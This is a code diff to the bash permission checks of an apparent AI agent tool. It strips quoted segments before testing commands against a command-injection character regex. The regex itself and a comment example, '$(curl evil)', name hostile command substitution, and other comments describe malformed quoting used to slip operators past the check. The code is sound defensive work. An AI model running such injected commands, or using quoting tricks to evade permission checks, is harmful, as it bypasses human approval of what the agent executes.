@@ -35,12 +35,89 @@ const PATTERN_SUFFIX = " *";
 // commands. Used by isSafeBashPatternPrefix to gate what we save to disk.
 const BASH_PATTERN_UNSAFE_CHARS = /['"`*?\[\]{}|&;<>$]/;
 // Chars that indicate command injection / chaining in a bash *command*. If a
-// command contains any of these, we refuse to extract a wildcard scope and we
-// refuse to match it against any cached wildcard pattern — the prefix matcher
-// cannot reason about what `&&`, `$(...)`, or backticks will actually run.
-// Quoted-argument content (`'` and `"`) is *not* in this set: a command like
-// `vipune add "lorem ipsum"` is safe to wildcard against `vipune add *`.
+// command contains any of these OUTSIDE quoted segments, we refuse to extract
+// a wildcard scope and we refuse to match it against any cached wildcard
+// pattern — the prefix matcher cannot reason about what `&&`, `$(...)`, or
+// backticks will actually run.
+//
+// IMPORTANT: this regex is applied to the OUTPUT of stripQuotedSegments(), not
+// to the raw command. `vipune add "lorem && ipsum"` extracts to `vipune add `
+// after quote-stripping and passes the test cleanly — bash never interprets
+// `&&` inside a quoted argument as a separator, so it isn't an injection
+// vector there. See issue #108.
 const BASH_COMMAND_INJECTION_CHARS = /[`$;&|<>\n]/;
+
+// Strip single- and double-quoted segments from a shell command, returning the
+// portion that bash would interpret as command structure (operators, paths,
+// flag names, etc.). Used to apply BASH_COMMAND_INJECTION_CHARS only against
+// the "executable" portion, so quoted arguments containing `&&`, `|`, `;`,
+// etc. don't trip the injection-vector check (issue #108).
+//
+// Edge case: an unterminated quote is a syntactic error in bash. We return
+// the ORIGINAL full command in that case — fail closed; the injection-vector
+// test will then see whatever's inside the unterminated quote and reject if
+// it contains operators. Defense in depth against an agent emitting malformed
+// quoting to slip operators past the check.
+//
+// Out of scope: command substitution `$(...)` / backticks — these stay in
+// the output of stripping and remain caught by the injection-vector regex
+// (correctly: `$(curl evil)` is a real injection vector even if visually
+// "inside" a string).
+function stripQuotedSegments(command: string): string {
+  let result = "";
+  let i = 0;
+  const n = command.length;
+  while (i < n) {
+    const ch = command[i];
+    if (ch === "'") {
+      // Single quotes: bash treats everything inside as literal — no
+      // variable expansion, no command substitution, no escape sequences.
+      // Strip the whole quoted run.
+      i++;
+      let foundClose = false;
+      while (i < n) {
+        if (command[i] === "'") {
+          foundClose = true;
+          i++;
+          break;
+        }
+        i++;
+      }
+      if (!foundClose) return command;
+    } else if (ch === '"') {
+      // Double quotes: most operators (`&`, `|`, `;`, `<`, `>`, newline) are
+      // literal inside, BUT bash still interprets `$` (variable + command
+      // substitution) and `` ` `` (command substitution) and `\` (escape).
+      // Keep `$` and `` ` `` in the output so the injection-vector check sees
+      // them — they're real injection vectors regardless of being "inside"
+      // the quotes.
+      i++;
+      let foundClose = false;
+      while (i < n) {
+        if (command[i] === "\\" && i + 1 < n) {
+          // Backslash escape — next char is literal, skip both.
+          i += 2;
+          continue;
+        }
+        if (command[i] === '"') {
+          foundClose = true;
+          i++;
+          break;
+        }
+        if (command[i] === "$" || command[i] === "`") {
+          result += command[i] ?? "";
+        }
+        // Other chars are literal inside double quotes — strip them.
+        i++;
+      }
+      if (!foundClose) return command;
+    } else {
+      result += ch;
+      i++;
+    }
+  }
+  return result;
+}
 
 // Pattern key helpers
 function buildPatternKey(prefix: string): string {
@@ -60,9 +137,10 @@ function isSafeBashPatternPrefix(prefix: string): boolean {
 export function getBashAlwaysScope(command: string): string | null {
   if (command.trim().length === 0) return null;
   // Commands with injection vectors (`&&`, `$(...)`, backticks, redirects, etc.)
-  // can't be safely wildcarded — what we'd cache as `cmd *` would also match
-  // benign invocations that contain the same injection at runtime.
-  if (BASH_COMMAND_INJECTION_CHARS.test(command)) return null;
+  // OUTSIDE quoted segments can't be safely wildcarded — what we'd cache as
+  // `cmd *` would also match benign invocations that contain the same
+  // injection at runtime. Quoted content is exempt (see stripQuotedSegments).
+  if (BASH_COMMAND_INJECTION_CHARS.test(stripQuotedSegments(command))) return null;
   const prefix = extractCommandPrefix(command);
   if (!isSafeBashPatternPrefix(prefix)) return null;
   return prefix;
@@ -84,10 +162,10 @@ function buildExactBashDecisionKey(command: string): string {
 export function bashPatternMatches(command: string, scope: string): boolean {
   if (!isSafeBashPatternPrefix(scope)) return false;
   // Even if the prefix matches, refuse to honour a wildcard for commands that
-  // contain injection vectors. This is the runtime mirror of the check in
-  // getBashAlwaysScope — a command with `$(...)` can't be auto-approved by any
-  // wildcard, only by an explicit "Allow once" decision.
-  if (BASH_COMMAND_INJECTION_CHARS.test(command)) return false;
+  // contain injection vectors OUTSIDE quoted segments. Runtime mirror of the
+  // check in getBashAlwaysScope — `$(...)` outside quotes can't be auto-
+  // approved by any wildcard, only by explicit "Allow once" decision.
+  if (BASH_COMMAND_INJECTION_CHARS.test(stripQuotedSegments(command))) return false;
   const matchesPrefix =
     command.startsWith(scope) && (command.length === scope.length || command[scope.length] === " ");
   if (!matchesPrefix) return false;
@@ -370,10 +448,11 @@ export const BUILTIN_TOOLS = new Set([
 //   - "pattern"    (no wildcard): exact match.
 // Most specific pattern wins (longest prefix). Catch-all "*" is checked last.
 //
-// Refuses to match commands containing injection vectors — those must always
-// reach the interactive prompt.
+// Refuses to match commands containing injection vectors OUTSIDE quoted
+// segments — those must always reach the interactive prompt. Quoted content
+// is transparent (see stripQuotedSegments and issue #108).
 function matchBashSubcommand(command: string, allowlist: Record<string, string>): string | null {
-  if (BASH_COMMAND_INJECTION_CHARS.test(command)) return null;
+  if (BASH_COMMAND_INJECTION_CHARS.test(stripQuotedSegments(command))) return null;
   // Sort patterns by length descending so the more specific entry wins.
   const patterns = Object.entries(allowlist)
     .filter(([k]) => k !== "*")
